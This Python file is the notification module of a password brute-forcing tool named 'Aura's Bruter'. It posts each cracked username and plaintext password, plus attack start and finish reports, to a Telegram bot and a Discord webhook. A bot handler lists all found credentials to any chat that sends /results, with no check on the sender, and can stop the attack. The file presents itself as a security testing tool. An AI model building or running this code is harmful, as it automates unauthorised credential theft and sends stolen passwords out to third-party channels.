#!/usr/bin/env python3
"""
Aura's Bruter - Notification System
Send alerts via Telegram, Discord, or Email when credentials are found
"""

import json
import asyncio
import aiohttp
from typing import Optional, Dict, Any
from dataclasses import dataclass
from pathlib import Path
from datetime import datetime


@dataclass
class NotificationConfig:
    """Configuration for notifications."""
    telegram_enabled: bool = False
    telegram_token: str = ""
    telegram_chat_id: str = ""
    
    discord_enabled: bool = False
    discord_webhook_url: str = ""


class Notifier:
    """
    Multi-platform notification system.
    Supports Telegram bot commands and Discord webhooks.
    """
    
    def __init__(self, config: Optional[NotificationConfig] = None):
        self.config = config or NotificationConfig()
        self._loop = None
    
    @classmethod
    def from_config_file(cls, config_path: str = "config.json") -> "Notifier":
        """Create a Notifier from config file."""
        path = Path(config_path)
        
        if not path.exists():
            return cls()
        
        try:
            with open(path, 'r') as f:
                data = json.load(f)
            
            telegram = data.get("telegram", {})
            discord = data.get("discord", {})
            
            config = NotificationConfig(
                telegram_enabled=telegram.get("enabled", False),
                telegram_token=telegram.get("token", ""),
                telegram_chat_id=telegram.get("chat_id", ""),
                discord_enabled=discord.get("enabled", False),
                discord_webhook_url=discord.get("webhook_url", "")
            )
            
            return cls(config)
        except Exception:
            return cls()
    
    def _get_loop(self):
        """Get or create event loop."""
        try:
            return asyncio.get_running_loop()
        except RuntimeError:
            if self._loop is None or self._loop.is_closed():
                self._loop = asyncio.new_event_loop()
            return self._loop
    
    def _run_async(self, coro):
        """Run async coroutine."""
        loop = self._get_loop()
        if loop.is_running():
            # Already in async context
            return asyncio.ensure_future(coro)
        else:
            return loop.run_until_complete(coro)
    
    async def _send_telegram_async(self, message: str) -> bool:
        """Send message via Telegram bot API."""
        if not self.config.telegram_enabled:
            return False
        
        if not self.config.telegram_token or not self.config.telegram_chat_id:
            return False
        
        url = f"https://api.telegram.org/bot{self.config.telegram_token}/sendMessage"
        
        payload = {
            "chat_id": self.config.telegram_chat_id,
            "text": message,
            "parse_mode": "HTML"
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=payload, timeout=10) as resp:
                    return resp.status == 200
        except Exception:
            return False
    
    async def _send_discord_async(self, message: str, embed: Dict = None) -> bool:
        """Send message via Discord webhook."""
        if not self.config.discord_enabled:
            return False
        
        if not self.config.discord_webhook_url:
            return False
        
        payload = {"content": message}
        
        if embed:
            payload["embeds"] = [embed]
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    self.config.discord_webhook_url,
                    json=payload,
                    timeout=10
                ) as resp:
                    return resp.status in (200, 204)
        except Exception:
            return False
    
    def send_credential_found(
        self,
        host: str,
        port: int,
        protocol: str,
        username: str,
        password: str
    ) -> Dict[str, bool]:
        """
        Send notification when a credential is found.
        
        Returns:
            Dict with results for each platform
        """
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Telegram message (HTML format)
        telegram_msg = f"""
🔓 <b>CREDENTIAL FOUND!</b>
━━━━━━━━━━━━━━━━━━━━
🖥️ <b>Host:</b> <code>{host}:{port}</code>
🔌 <b>Protocol:</b> {protocol.upper()}
👤 <b>Username:</b> <code>{username}</code>
🔑 <b>Password:</b> <code>{password}</code>
⏰ <b>Time:</b> {timestamp}
━━━━━━━━━━━━━━━━━━━━
<i>Aura's Bruter - Security Testing Tool</i>
"""
        
        # Discord embed
        discord_embed = {
            "title": "🔓 CREDENTIAL FOUND!",
            "color": 0x00FF00,  # Green
            "fields": [
                {"name": "🖥️ Host", "value": f"`{host}:{port}`", "inline": True},
                {"name": "🔌 Protocol", "value": protocol.upper(), "inline": True},
                {"name": "👤 Username", "value": f"`{username}`", "inline": True},
                {"name": "🔑 Password", "value": f"||`{password}`||", "inline": True},
            ],
            "footer": {"text": "Aura's Bruter - Security Testing Tool"},
            "timestamp": datetime.utcnow().isoformat()
        }
        
        results = {"telegram": False, "discord": False}
        
        async def send_all():
            results["telegram"] = await self._send_telegram_async(telegram_msg)
            results["discord"] = await self._send_discord_async("", discord_embed)
        
        self._run_async(send_all())
        
        return results
    
    def send_attack_started(
        self,
        host: str,
        port: int,
        protocol: str,
        mode: str,
        total_combinations: int
    ) -> Dict[str, bool]:
        """Send notification when an attack starts."""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        telegram_msg = f"""
🚀 <b>ATTACK STARTED</b>
━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>{host}:{port}</code>
🔌 <b>Protocol:</b> {protocol.upper()}
📋 <b>Mode:</b> {mode}
🔢 <b>Combinations:</b> {total_combinations:,}
⏰ <b>Started:</b> {timestamp}
━━━━━━━━━━━━━━━━━━━━
"""
        
        results = {"telegram": False, "discord": False}
        
        async def send_all():
            results["telegram"] = await self._send_telegram_async(telegram_msg)
            results["discord"] = await self._send_discord_async(
                f"🚀 **Attack Started** on `{host}:{port}` ({protocol.upper()}) - {total_combinations:,} combinations"
            )
        
        self._run_async(send_all())
        
        return results
    
    def send_attack_completed(
        self,
        host: str,
        port: int,
        protocol: str,
        tested: int,
        found: int,
        duration: str
    ) -> Dict[str, bool]:
        """Send notification when an attack completes."""
        
        telegram_msg = f"""
✅ <b>ATTACK COMPLETED</b>
━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>{host}:{port}</code>
🔌 <b>Protocol:</b> {protocol.upper()}
📊 <b>Tested:</b> {tested:,}
🔓 <b>Found:</b> {found}
⏱️ <b>Duration:</b> {duration}
━━━━━━━━━━━━━━━━━━━━
"""
        
        results = {"telegram": False, "discord": False}
        
        async def send_all():
            results["telegram"] = await self._send_telegram_async(telegram_msg)
            results["discord"] = await self._send_discord_async(
                f"✅ **Attack Completed** on `{host}:{port}` - Tested: {tested:,}, Found: {found}, Duration: {duration}"
            )
        
        self._run_async(send_all())
        
        return results
    
    def send_status(self, status_text: str) -> Dict[str, bool]:
        """Send a general status update."""
        results = {"telegram": False, "discord": False}
        
        async def send_all():
            results["telegram"] = await self._send_telegram_async(f"ℹ️ {status_text}")
            results["discord"] = await self._send_discord_async(f"ℹ️ {status_text}")
        
        self._run_async(send_all())
        
        return results
    
    def is_configured(self) -> bool:
        """Check if any notification method is configured."""
        return self.config.telegram_enabled or self.config.discord_enabled
    
    def get_status(self) -> Dict[str, Any]:
        """Get notification system status."""
        return {
            "telegram": {
                "enabled": self.config.telegram_enabled,
                "configured": bool(self.config.telegram_token and self.config.telegram_chat_id)
            },
            "discord": {
                "enabled": self.config.discord_enabled,
                "configured": bool(self.config.discord_webhook_url)
            }
        }


class TelegramBotHandler:
    """
    Handle incoming Telegram bot commands.
    Commands: /status, /stop, /results, /help
    """
    
    def __init__(self, token: str, attack_controller = None):
        self.token = token
        self.attack_controller = attack_controller
        self.running = False
    
    async def get_updates(self, offset: int = 0) -> list:
        """Get new messages from Telegram."""
        url = f"https://api.telegram.org/bot{self.token}/getUpdates"
        params = {"offset": offset, "timeout": 30}
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, params=params, timeout=35) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        return data.get("result", [])
        except Exception:
            pass
        
        return []
    
    async def send_message(self, chat_id: str, text: str) -> bool:
        """Send a message to a chat."""
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json={
                    "chat_id": chat_id,
                    "text": text,
                    "parse_mode": "HTML"
                }, timeout=10) as resp:
                    return resp.status == 200
        except Exception:
            return False
    
    async def handle_command(self, chat_id: str, command: str) -> str:
        """Handle a bot command and return response."""
        cmd = command.lower().strip()
        
        if cmd == "/start" or cmd == "/help":
            return """
🔐 <b>Aura's Bruter Bot</b>

<b>Available Commands:</b>
/status - View current attack status
/results - View found credentials
/stop - Stop current attack
/help - Show this message

<i>Use responsibly and legally!</i>
"""
        
        elif cmd == "/status":
            if self.attack_controller and hasattr(self.attack_controller, 'get_status'):
                status = self.attack_controller.get_status()
                return f"""
📊 <b>Attack Status</b>
━━━━━━━━━━━━━━
🎯 Target: <code>{status.get('target', 'N/A')}</code>
📈 Progress: {status.get('progress', 0)}%
🔢 Tested: {status.get('tested', 0):,}
🔓 Found: {status.get('found', 0)}
⚡ Speed: {status.get('speed', 0)}/sec
"""
            else:
                return "❌ No attack is currently running."
        
        elif cmd == "/results":
            if self.attack_controller and hasattr(self.attack_controller, 'get_results'):
                results = self.attack_controller.get_results()
                if results:
                    text = "🔓 <b>Found Credentials</b>\n━━━━━━━━━━━━━━\n"
                    for cred in results:
                        text += f"👤 <code>{cred['username']}</code> : <code>{cred['password']}</code>\n"
                    return text
                else:
                    return "🔍 No credentials found yet."
            else:
                return "❌ No attack results available."
        
        elif cmd == "/stop":
            if self.attack_controller and hasattr(self.attack_controller, 'stop'):
                self.attack_controller.stop()
                return "🛑 Attack stopped."
            else:
                return "❌ No attack to stop."
        
        else:
            return "❓ Unknown command. Use /help for available commands."
    
    async def poll_loop(self):
        """Main polling loop for bot commands."""
        offset = 0
        self.running = True
        
        while self.running:
            try:
                updates = await self.get_updates(offset)
                
                for update in updates:
                    offset = update["update_id"] + 1
                    
                    if "message" in update:
                        msg = update["message"]
                        chat_id = str(msg["chat"]["id"])
                        text = msg.get("text", "")
                        
                        if text.startswith("/"):
                            response = await self.handle_command(chat_id, text)
                            await self.send_message(chat_id, response)
            
            except Exception:
                await asyncio.sleep(5)
    
    def stop(self):
        """Stop the polling loop."""
        self.running = False


if __name__ == "__main__":
    # Demo
    from rich.console import Console
    console = Console()
    
    notifier = Notifier(NotificationConfig(
        telegram_enabled=True,
        telegram_token="YOUR_TOKEN",
        telegram_chat_id="YOUR_CHAT_ID"
    ))
    
    console.print("[yellow]Notification system initialized[/yellow]")
    console.print(f"Status: {notifier.get_status()}")
